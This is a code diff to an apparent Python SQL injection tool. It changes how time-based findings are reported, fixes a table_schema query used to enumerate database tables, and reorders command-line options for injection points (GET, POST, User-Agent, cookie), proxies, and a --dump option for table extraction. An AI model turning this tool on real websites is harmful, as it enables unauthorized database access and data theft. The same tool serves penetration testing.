@@ -391,9 +391,9 @@ def testRun():
                             if (response.elapsed.total_seconds() >= dSec) or (tdelta >= dSec*1000):
                                 findN += 1
                                 payloadFinding.append(str(findN))
-                                payloadFinding.append(subMethod)
-                                payloadFinding.append('['+qt+']')
-                                payloadFinding.append('['+mpP+']')
+                                payloadFinding.append(subMethod+" ("+str(gethdik)+")")
+                                payloadFinding.append('['+qt+mpP+']')
+                                #payloadFinding.append('['+mpP+']')
                                 payloadFinding.append('['+spcF+']')
                                 payloadFinding.append('['+mpS+']')
                                 payloadFinding.append('['+sufF+']')
@@ -415,10 +415,12 @@ def testRun():
         print('---')
         print('!Attack vector(s) found: '+str(findN)+'!')
         #print(payloadParams)
-        print(tabulate(payloadParams, headers=['#','rnd','quote -ph','plPfx -ph','-sp(ace)','colNull','suffix -pt','payload'], tablefmt='orgtbl'))
+        print(tabulate(payloadParams, headers=['#','suMethod','-ph(ead)','-sp(ace)','cNulls','-pt(ail)','payload'], tablefmt='orgtbl'))
         print('---')
     else:
-        print('Not found. :-(')
+        print('+------------------+')
+        print('|  Not found. :-(  |')
+        print('+------------------+')
     return result
 
 def charFind_sqliType(forWhat, whatLen):
@@ -662,7 +664,7 @@ def db_alap_q(roundS,desc,query,rest,limites):
         if limites:
             if query == "table_name":
                 if defDBt:
-                    restValue = restValue+" WHERE table schema="+dbname+""
+                    restValue = restValue+" WHERE table_schema="+dbname+""
                 else:
                     restValue = restValue+" WHERE table_schema='"+dbname+"'"
             restValue = restValue+" LIMIT "+str(os)+",1"
@@ -835,13 +837,12 @@ def main():
     parser = argparse.ArgumentParser()
     parser.add_argument("-u","--url",help="Input an url.",type=str)
     parser.add_argument("-up","--url_port",help="Input a portnumber for url (default = 80).",type=int)
+    parser.add_argument("-df","--dirfile",help="Url ending [/dir]/file.",type=str)
     parser.add_argument("-m","--method",help="Call method. (default = GET )",type=str)
     parser.add_argument("-sm","--sub_method",help="Call sub method. (GET [default 0 - GETPARAM, 1 - GETSTRING, 2 - GETDIRECT]; POST [default 0 - POSTDATA, 1 - USERAGENT, 2 - COOKIEMOD])",type=int)
     parser.add_argument("--ssl",action='store_true')
     parser.add_argument("-p","--proxy_http",help="Input a http proxy",type=str)
     parser.add_argument("-ps","--proxy_https",help="Input a https proxy",type=str)
-    parser.add_argument("-st","--sqli_type",help="Input SQLi type (default 0 - time-based, 1 - error-based).",type=int)
-    parser.add_argument("-rs","--response_size",help="Response limit size (kb)",type=int)
 
     parser.add_argument("--test",help="Payload test run (paramters needed).",action='store_true')
     parser.add_argument("--info",help="Default functions call.",action='store_true')
@@ -852,16 +853,17 @@ def main():
     parser.add_argument("-T","--table",help="Selected table name.",type=str)
     parser.add_argument("--dump",help="Selected table: -T dump in selected DB: -D.",action='store_true')
 
+    parser.add_argument("-st","--sqli_type",help="Input SQLi type (default 0 - time-based, 1 - error-based).",type=int)
     parser.add_argument("-rt","--response_time",help="Delay time in second. (default 1, 1 -> 5 )",type=int)
-    parser.add_argument("-sp","--space",help="Space replacement char(s).",type=str)
-    parser.add_argument("-v","--verbose",help="Verbose level. (default = 0, 0 -> 3 )",type=int)
+    parser.add_argument("-rs","--response_size",help="Response limit size (kb)",type=int)
+    parser.add_argument("-v","--verbose",default=0,help="Verbose level. INFO=0, DEBUG=1, TRACE=2, ALL=3",type=int)
 
-    parser.add_argument("-df","--dirfile",help="Url ending [/dir]/file.",type=str)
     parser.add_argument("-ph","--paramshead",help="Paramter/Payloadstring before payload.",type=str)
+    parser.add_argument("-sp","--space",help="Space replacement char(s).",type=str)
     parser.add_argument("-pt","--paramstail",help="Paramter/Payloadstring after payload.",type=str)
     parser.add_argument("-uad","--useragent_data",help="In case Useragent method, POST data.",type=str)
-    parser.add_argument("-ck","--cookie",help="Cookie value.",type=str)
     parser.add_argument("-uag","--user_agent",help="User-Agent value.",type=str)
+    parser.add_argument("-ck","--cookie",help="Cookie value.",type=str)
 
     if len(sys.argv) == 1:
         parser.print_help()
@@ -929,6 +931,7 @@ def main():
                    print("For -st (sqli_type) 2, You must input response size limit -rs (response_size)!")
                    canGo = False
     if(args.verbose):
+            #logging.basicConfig(level=log_levels[args.verbosity])
             verbVar=args.verbose
             if verbVar < 0:
                 verbVar = 0
